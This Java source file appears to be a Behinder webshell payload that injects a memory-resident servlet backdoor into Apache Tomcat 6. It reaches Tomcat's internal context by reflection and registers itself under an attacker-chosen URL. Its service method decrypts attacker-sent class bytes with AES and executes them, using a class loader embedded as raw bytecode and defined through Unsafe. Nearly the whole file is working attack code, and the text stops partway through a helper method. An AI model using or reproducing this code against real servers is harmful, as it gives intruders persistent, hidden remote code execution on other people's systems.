    package net.rebeyond.behinder.payload.java;
    //import com.sun.beans.decoder.FieldElementHandler;
    import org.apache.catalina.Container;
    import org.apache.catalina.Wrapper;
    import org.apache.catalina.core.ApplicationContext;
    import org.apache.catalina.core.StandardContext;
    import sun.misc.Unsafe;
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    import javax.servlet.*;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpSession;
    import javax.servlet.jsp.PageContext;
    import java.io.IOException;
    import java.lang.reflect.Array;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.ArrayList;
    public class Injectwebshell_tomcat6 extends ClassLoader implements Servlet  {
        public static String url;
        public static String password;
        public static String filtername;
        private ServletRequest Request;
        private ServletResponse Response;
        private HttpSession Session;
        public Injectwebshell_tomcat6() {}
        public boolean fuck(String k, ServletRequest request, ServletResponse response, HttpSession session){
    //        PageContext page = (PageContext)obj;
            PageContext page = null;
            this.Session = page.getSession();
            this.Response = page.getResponse();
            this.Request = page.getRequest();
    //        System.out.println("ffffffffffffffffffffffffffffffffffffff");
            String filterUrlPattern = url;
            String filterName = filtername;
    //        String pass = password;
    //        System.out.println(url+"   "+myfilter_string);
    //        System.out.println(url+"   ");
            try {
                ServletContext servletContext = page.getServletContext();
    //            ServletContext servletContext = (ServletContext) field.get(standardContext);
    //            System.out.println("11111");
    //            System.out.println(servletContext);
                //获取ApplicationContext
                Field field = servletContext.getClass().getDeclaredField("context");
                field.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
                //获取StandardContext
                field = applicationContext.getClass().getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(applicationContext);
                if (standardContext != null) {
                    //修改状态，要不然添加不了
                    Field stateField = org.apache.catalina.util.LifecycleBase.class
                            .getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                    //创建一个自定义的Servlet马
                    Servlet my_servlet = new Injectwebshell_tomcat6();
                    //添加Servlet马
                    standardContext.getClass().getDeclaredMethod("addChild", Container.class).invoke(standardContext,my_servlet);
                    Method method;
                    try {
                        method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
                    }catch (Exception e){
                        method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
                    }
                    method.invoke(standardContext,filterUrlPattern,filterName);
    //                if (getMethodByClass(my_servlet.getClass(),"setServlet",Servlet.class) == null){
    //                    init((ServletConfig)getFieldValue())
    //                }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return true;
        }
        public boolean equals(Object obj) {
            PageContext page = (PageContext)obj;
            this.Session = page.getSession();
            this.Response = page.getResponse();
            this.Request = page.getRequest();
    //        System.out.println("666666666666666666666666666666666666666666666f");
            String filterUrlPattern = url;
            String filterName = filtername;
    //        String pass = password;
    //        System.out.println(url+"   "+myfilter_string);
    //        System.out.println(url+"   ");
            try {
                ServletContext servletContext = page.getServletContext();
    //            System.out.println(servletContext);
                //获取ApplicationContext
                Field field = servletContext.getClass().getDeclaredField("context");
                field.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
                //获取StandardContext
                field = applicationContext.getClass().getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(applicationContext);
                if (standardContext != null) {
                    Object o = getFieldValue(standardContext.getServletContext(), "context");
                    Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[])null);
                    this.invoke(newWrapper, "setName", filterName);
                    setFieldValue(newWrapper, "instance", this);
                    Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
                    Object oldWrapper = this.invoke(standardContext, "findChild", filterName);
                    if (oldWrapper != null) {
                        standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
                    }
                    standardContext.getClass().getDeclaredMethod("addChild", containerClass).invoke(standardContext, newWrapper);
                    Method method;
                    try {
                        method = standardContext.getClass().getMethod("addServletMappingDecoded", String.class, String.class);
                    } catch (Exception var9) {
                        method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
                    }
                    method.invoke(standardContext, filterUrlPattern, filterName);
                    if (this.getMethodByClass(newWrapper.getClass(), "setServlet", Servlet.class) == null) {
                        this.transform(standardContext, filterUrlPattern);
                        this.init((ServletConfig)getFieldValue(newWrapper, "facade"));
                    }
                }
            } catch (Exception e) {
    //            e.printStackTrace();
            }
            return true;
        }
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
    //        System.out.println("Servlet被执行了....\n");
            String k= password;
            boolean test = false;
            try{
                HttpSession session = ((HttpServletRequest) req).getSession();
                session.putValue("u",k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
                String reader = req.getReader().readLine();
    //            System.out.println(reader);
    //            System.out.println("\n\n\n this is reader\n\n");
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(reader));
                try {
                    test = null != Class.forName("net.rebeyond.behinder.core.U");
                } catch (Throwable t) {
                    test = false;
                }
                if (test) {
                    Class Uclass = Class.forName("net.rebeyond.behinder.core.U");
                    System.out.println(Uclass.getClass());
                    Constructor tt = Uclass.getDeclaredConstructor(ClassLoader.class);
                    tt.setAccessible(true);
                    Object xx = tt.newInstance(this.getClass().getClassLoader());
                    Method tt1 = Uclass.getDeclaredMethod("g", byte[].class);
                    tt1.setAccessible(true);
                    Class evilClass = (Class) tt1.invoke(xx, evilClassBytes);
                    Object a = evilClass.newInstance();
                    Method b = evilClass.getDeclaredMethod("fuck", String.class, ServletRequest.class, ServletResponse.class, HttpSession.class);
                    b.invoke(a, k, req, resp, session);
                    return;
                }else{
                    //这里解决了 好开心
                    byte[] Uclassbate = new byte[] {-54, -2, -70, -66, 0, 0, 0, 51, 0, 26, 10, 0, 4, 0, 20, 10, 0, 4, 0, 21, 7, 0, 22, 7, 0, 23, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 26, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 59, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 30, 76, 110, 101, 116, 47, 114, 101, 98, 101, 121, 111, 110, 100, 47, 98, 101, 104, 105, 110, 100, 101, 114, 47, 99, 111, 114, 101, 47, 85, 59, 1, 0, 1, 99, 1, 0, 23, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 59, 1, 0, 1, 103, 1, 0, 21, 40, 91, 66, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 1, 0, 1, 98, 1, 0, 2, 91, 66, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 6, 85, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 12, 0, 24, 0, 25, 1, 0, 28, 110, 101, 116, 47, 114, 101, 98, 101, 121, 111, 110, 100, 47, 98, 101, 104, 105, 110, 100, 101, 114, 47, 99, 111, 114, 101, 47, 85, 1, 0, 21, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114, 1, 0, 11, 100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 1, 0, 23, 40, 91, 66, 73, 73, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 0, 32, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 0, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 62, 0, 2, 0, 2, 0, 0, 0, 6, 42, 43, -73, 0, 1, -79, 0, 0, 0, 2, 0, 8, 0, 0, 0, 10, 0, 2, 0, 0, 0, 5, 0, 5, 0, 6, 0, 9, 0, 0, 0, 22, 0, 2, 0, 0, 0, 6, 0, 10, 0, 11, 0, 0, 0, 0, 0, 6, 0, 12, 0, 13, 0, 1, 0, 1, 0, 14, 0, 15, 0, 1, 0, 7, 0, 0, 0, 61, 0, 4, 0, 2, 0, 0, 0, 9, 42, 43, 3, 43, -66, -73, 0, 2, -80, 0, 0, 0, 2, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 8, 0, 9, 0, 0, 0, 22, 0, 2, 0, 0, 0, 9, 0, 10, 0, 11, 0, 0, 0, 0, 0, 9, 0, 16, 0, 17, 0, 1, 0, 1, 0, 18, 0, 0, 0, 2, 0, 19};
                    Field field = Unsafe.class.getDeclaredField("theUnsafe");
                    field.setAccessible(true);
                    Unsafe unsafe = (Unsafe)field.get(Unsafe.class);
                    Class Uclass = unsafe.defineClass("net.rebeyond.behinder.core.U",Uclassbate,0,Uclassbate.length,null, null);
                    Constructor tt = Uclass.getDeclaredConstructor(ClassLoader.class);
                    tt.setAccessible(true);
                    Object xx = tt.newInstance(this.getClass().getClassLoader());
                    Method Um = Uclass.getDeclaredMethod("g",byte[].class);
                    Um.setAccessible(true);
                    Class evilclass = (Class) Um.invoke(xx,evilClassBytes);
                    Object a = evilclass.newInstance();
                    Method b = evilclass.getDeclaredMethod("fuck",String.class,ServletRequest.class, ServletResponse.class,HttpSession.class);
                    b.invoke(a, k,req, resp,session);
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();//实际中这里注释掉 调试用
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
        Object invoke(Object obj, String methodName, Object... parameters) {
            try {
                ArrayList classes = new ArrayList();
                if (parameters != null) {
                    for(int i = 0; i < parameters.length; ++i) {
                        Object o1 = parameters[i];
                        if (o1 != null) {
                            classes.add(o1.getClass());
                        } else {
                            classes.add((Object)null);
                        }
                    }
                }
                Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[0]));
                return method.invoke(obj, parameters);
            } catch (Exception var7) {
                return null;
            }
        }
        Method getMethodByClass(Class cs, String methodName, Class... parameters) {
            Method method = null;
            while(cs != null) {
                try {
                    method = cs.getDeclaredMethod(methodName, parameters);